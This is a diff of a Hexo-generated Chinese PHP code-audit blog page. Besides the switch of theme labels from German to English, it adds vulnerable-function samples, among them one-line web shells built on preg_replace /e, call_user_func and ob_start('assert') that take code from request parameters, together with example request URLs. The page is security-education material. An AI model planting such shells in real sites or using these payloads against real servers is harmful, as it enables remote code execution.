@@ -92,7 +92,7 @@
 <meta property="og:site_name" content="xl7dev">
 <meta property="og:description" content="代码审计redirection/URL重定向1) META标签内跳转1&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0.1; url=http://blog.safebuff.com/&amp;quot;&amp;gt;
 2) Javascript跳转1234&amp;lt;script&amp;gt;window.location.href = &amp;quot;http">
-<meta property="og:updated_time" content="2016-06-22T18:51:28.000Z">
+<meta property="og:updated_time" content="2016-08-23T14:45:44.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP Code Review">
 <meta name="twitter:description" content="代码审计redirection/URL重定向1) META标签内跳转1&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0.1; url=http://blog.safebuff.com/&amp;quot;&amp;gt;
@@ -177,7 +177,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Startseite
+            Home
           </a>
         </li>
       
@@ -187,7 +187,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archiv
+            Archives
           </a>
         </li>
       
@@ -210,7 +210,7 @@
             
               <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
             
-            Suche
+            Search
           </a>
         </li>
       
@@ -273,7 +273,7 @@
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <span class="post-meta-item-text">Posted on</span>
             <time itemprop="dateCreated" datetime="2016-03-15T00:19:17+08:00" content="2016-03-15">
               2016-03-15
             </time>
@@ -335,13 +335,19 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cookie</span><br><span class="line">session</span><br><span class="line">oauth</span><br><span class="line">openid</span><br></pre></td></tr></table></figure>
 <h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">中间件解析</span><br><span class="line">move_uploaded_file()</span><br><span class="line">文件头 content-type验证绕过</span><br></pre></td></tr></table></figure>
 <h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><h4 id="1-eval-、assert"><a href="#1-eval-、assert" class="headerlink" title="1) eval()、assert()"></a>1) eval()、assert()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval(&quot; phpinfo(); &quot;);?&gt;</span><br><span class="line">&lt;?php assert(&quot; phpinfo(); &quot;);?&gt;</span><br><span class="line">&lt;?php $a=&quot;$&#123;@phpinfo()&#125;&quot;;?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="2-preg-replace"><a href="#2-preg-replace" class="headerlink" title="2) preg_replace()"></a>2) preg_replace()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line">&lt;?php @preg_replace(&quot;//e&quot;,$_GET[&apos;shell&apos;],&quot;Access Denied&quot;);?&gt;    shell.php?shell=phpinfo()</span><br></pre></td></tr></table></figure>
-<h4 id="3-call-user-func"><a href="#3-call-user-func" class="headerlink" title="3) call_user_func()"></a>3) call_user_func()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //test.php?a=assert</span><br><span class="line">    $a = $_GET[&apos;a&apos;];</span><br><span class="line">    call_user_func($a,&apos;phpinfo()&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2-preg-replace"><a href="#2-preg-replace" class="headerlink" title="2) preg_replace()"></a>2) preg_replace()</h4><blockquote>
+<p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo $regexp = $_GET[&apos;reg&apos;];$var = &apos;&lt;php&gt;phpinfo()&lt;/php&gt;&apos;;preg_replace(&quot;/&lt;php&gt;(.*?)$regexp&quot;, &apos;\1&apos;, $var);?&gt;</span><br><span class="line"></span><br><span class="line">http://www.example.com/shell.php?reg=%3C/php%3E/e</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @preg_replace(&quot;//e&quot;,$_GET[&apos;shell&apos;],&quot;Access Denied&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">http://www.example.com/shell.php?shell=phpinfo()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &quot;\1&quot;, $_GET[&apos;h&apos;]);?&gt;</span><br><span class="line"></span><br><span class="line">http://www.example.com/shell.php?h=[php]$&#123;phpinfo%28%29&#125;[/php]</span><br><span class="line">or</span><br><span class="line">http://www.example.com/shell.php?h=[php]phpinfo()[/php]</span><br></pre></td></tr></table></figure>
+<h4 id="3-回调函数call-user-func"><a href="#3-回调函数call-user-func" class="headerlink" title="3) 回调函数call_user_func()"></a>3) 回调函数call_user_func()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //test.php?a=assert</span><br><span class="line">    $a = $_GET[&apos;a&apos;];</span><br><span class="line">    call_user_func($a,&apos;phpinfo()&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <h4 id="4-动态函数执行"><a href="#4-动态函数执行" class="headerlink" title="4) 动态函数执行"></a>4) 动态函数执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //test.php?a=assert&amp;b=phpinfo()</span><br><span class="line">    $_GET[&apos;a&apos;]($_GET[&apos;b&apos;]); ///assert(phpinfo());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <h4 id="5-命令执行函数"><a href="#5-命令执行函数" class="headerlink" title="5) 命令执行函数"></a>5) 命令执行函数</h4><blockquote>
-<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()、<code>whoami</code></p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">popen( &apos;whoami &gt;&gt; 1.txt&apos;, &apos;r&apos; ); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="6-ob-start-函数"><a href="#6-ob-start-函数" class="headerlink" title="6) ob_start()函数"></a>6) ob_start()函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ob_start(&apos;assert&apos;);echo $_REQUEST[&apos;pass&apos;];ob_end_flush();?&gt;</span><br><span class="line"></span><br><span class="line">http://www.example.com/shell.php?e=assert&amp;pass=file_get_contents(&apos;http://www.dnsdomain.com/&apos;)</span><br></pre></td></tr></table></figure>
 <h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="1-extract-函数"><a href="#1-extract-函数" class="headerlink" title="1) extract()函数"></a>1) extract()函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖。</span><br><span class="line">语法</span><br><span class="line">　　extract(array,extract_rules,prefix)</span><br><span class="line">参数</span><br><span class="line">　　array 必需。规定要使用的输入。</span><br><span class="line">　　extract_rules</span><br><span class="line">　　　　·EXTR_OVERWRITE – 默认。如果有冲突，则覆盖已有的变量。</span><br><span class="line">　　　　·EXTR_SKIP – 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）</span><br><span class="line">　　prefix 可选。</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>example</p>
@@ -404,16 +410,16 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/03/12/Raspberry-Pi-Tips/" rel="next" title="Raspberry Pi Tips">
-                <i class="fa fa-chevron-left"></i> Raspberry Pi Tips
+              <a href="/2016/03/15/Metasploit-Install-On-Mac-osx-10-11-3/" rel="next" title="Metasploit Install On Mac osx 10.11.3">
+                <i class="fa fa-chevron-left"></i> Metasploit Install On Mac osx 10.11.3
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/03/15/Metasploit-Install-On-Mac-osx-10-11-3/" rel="prev" title="Metasploit Install On Mac osx 10.11.3">
-                Metasploit Install On Mac osx 10.11.3 <i class="fa fa-chevron-right"></i>
+              <a href="/2016/03/15/Run-Ngrok-on-Your-Own-Server/" rel="prev" title="Run Ngrok on Your Own Server">
+                Run Ngrok on Your Own Server <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -467,10 +473,10 @@
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            Inhaltsverzeichnis
+            Table of Contents
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
-            Übersicht
+            Overview
           </li>
         </ul>
       
@@ -486,8 +492,8 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">47</span>
-              <span class="site-state-item-name">Artikel</span>
+              <span class="site-state-item-count">48</span>
+              <span class="site-state-item-name">posts</span>
             </a>
           </div>
 
@@ -497,7 +503,7 @@
             <div class="site-state-item site-state-tags">
               <a href="/tags">
                 <span class="site-state-item-count">43</span>
-                <span class="site-state-item-name">Tags</span>
+                <span class="site-state-item-name">tags</span>
               </a>
             </div>
           
@@ -574,7 +580,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计"><span class="nav-number">1.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#redirection-URL重定向"><span class="nav-number">1.1.</span> <span class="nav-text">redirection/URL重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-META标签内跳转"><span class="nav-number">1.1.1.</span> <span class="nav-text">1) META标签内跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Javascript跳转"><span class="nav-number">1.1.2.</span> <span class="nav-text">2) Javascript跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-header头跳转"><span class="nav-number">1.1.3.</span> <span class="nav-text">3) header头跳转</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地文件包含"><span class="nav-number">1.2.</span> <span class="nav-text">本地文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-include-include-once-，require-require-once-本地文件包含"><span class="nav-number">1.2.1.</span> <span class="nav-text">1) include()/include_once()，require()/require_once()本地文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-allow-url-include远程文件包含"><span class="nav-number">1.2.2.</span> <span class="nav-text">2) allow_url_include远程文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-bypass-file-include"><span class="nav-number">1.2.3.</span> <span class="nav-text">3) bypass file include</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件读取"><span class="nav-number">1.3.</span> <span class="nav-text">文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#关键函数"><span class="nav-number">1.3.1.</span> <span class="nav-text">关键函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除文件"><span class="nav-number">1.4.</span> <span class="nav-text">删除文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#会话认证"><span class="nav-number">1.5.</span> <span class="nav-text">会话认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.6.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码执行漏洞"><span class="nav-number">1.7.</span> <span class="nav-text">代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-eval-、assert"><span class="nav-number">1.7.1.</span> <span class="nav-text">1) eval()、assert()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-preg-replace"><span class="nav-number">1.7.2.</span> <span class="nav-text">2) preg_replace()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-call-user-func"><span class="nav-number">1.7.3.</span> <span class="nav-text">3) call_user_func()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-动态函数执行"><span class="nav-number">1.7.4.</span> <span class="nav-text">4) 动态函数执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-命令执行函数"><span class="nav-number">1.7.5.</span> <span class="nav-text">5) 命令执行函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量覆盖"><span class="nav-number">1.8.</span> <span class="nav-text">变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-extract-函数"><span class="nav-number">1.8.1.</span> <span class="nav-text">1) extract()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-遍历初始化变量"><span class="nav-number">1.8.2.</span> <span class="nav-text">2) 遍历初始化变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-parse-str-变量覆盖漏洞"><span class="nav-number">1.8.3.</span> <span class="nav-text">3) parse_str()变量覆盖漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-import-request-variables-变量覆盖漏洞"><span class="nav-number">1.8.4.</span> <span class="nav-text">4) import_request_variables()变量覆盖漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-可变变量"><span class="nav-number">1.8.5.</span> <span class="nav-text">5) $$可变变量</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">1.9.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.10.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#二次注入"><span class="nav-number">1.10.1.</span> <span class="nav-text">二次注入</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计"><span class="nav-number">1.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#redirection-URL重定向"><span class="nav-number">1.1.</span> <span class="nav-text">redirection/URL重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-META标签内跳转"><span class="nav-number">1.1.1.</span> <span class="nav-text">1) META标签内跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Javascript跳转"><span class="nav-number">1.1.2.</span> <span class="nav-text">2) Javascript跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-header头跳转"><span class="nav-number">1.1.3.</span> <span class="nav-text">3) header头跳转</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地文件包含"><span class="nav-number">1.2.</span> <span class="nav-text">本地文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-include-include-once-，require-require-once-本地文件包含"><span class="nav-number">1.2.1.</span> <span class="nav-text">1) include()/include_once()，require()/require_once()本地文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-allow-url-include远程文件包含"><span class="nav-number">1.2.2.</span> <span class="nav-text">2) allow_url_include远程文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-bypass-file-include"><span class="nav-number">1.2.3.</span> <span class="nav-text">3) bypass file include</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件读取"><span class="nav-number">1.3.</span> <span class="nav-text">文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#关键函数"><span class="nav-number">1.3.1.</span> <span class="nav-text">关键函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除文件"><span class="nav-number">1.4.</span> <span class="nav-text">删除文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#会话认证"><span class="nav-number">1.5.</span> <span class="nav-text">会话认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.6.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码执行漏洞"><span class="nav-number">1.7.</span> <span class="nav-text">代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-eval-、assert"><span class="nav-number">1.7.1.</span> <span class="nav-text">1) eval()、assert()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-preg-replace"><span class="nav-number">1.7.2.</span> <span class="nav-text">2) preg_replace()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-回调函数call-user-func"><span class="nav-number">1.7.3.</span> <span class="nav-text">3) 回调函数call_user_func()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-动态函数执行"><span class="nav-number">1.7.4.</span> <span class="nav-text">4) 动态函数执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-命令执行函数"><span class="nav-number">1.7.5.</span> <span class="nav-text">5) 命令执行函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-ob-start-函数"><span class="nav-number">1.7.6.</span> <span class="nav-text">6) ob_start()函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量覆盖"><span class="nav-number">1.8.</span> <span class="nav-text">变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-extract-函数"><span class="nav-number">1.8.1.</span> <span class="nav-text">1) extract()函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-遍历初始化变量"><span class="nav-number">1.8.2.</span> <span class="nav-text">2) 遍历初始化变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-parse-str-变量覆盖漏洞"><span class="nav-number">1.8.3.</span> <span class="nav-text">3) parse_str()变量覆盖漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-import-request-variables-变量覆盖漏洞"><span class="nav-number">1.8.4.</span> <span class="nav-text">4) import_request_variables()变量覆盖漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-可变变量"><span class="nav-number">1.8.5.</span> <span class="nav-text">5) $$可变变量</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">1.9.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.10.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#二次注入"><span class="nav-number">1.10.1.</span> <span class="nav-text">二次注入</span></a></li></ol></li></ol></li></ol></div>
             
           </div>
         </section>
@@ -601,7 +607,7 @@
 </div>
 
 <div class="powered-by">
-  Erstellt mit  <a class="theme-link" href="http://hexo.io">Hexo</a>
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
 </div>
 
 <div class="theme-info">
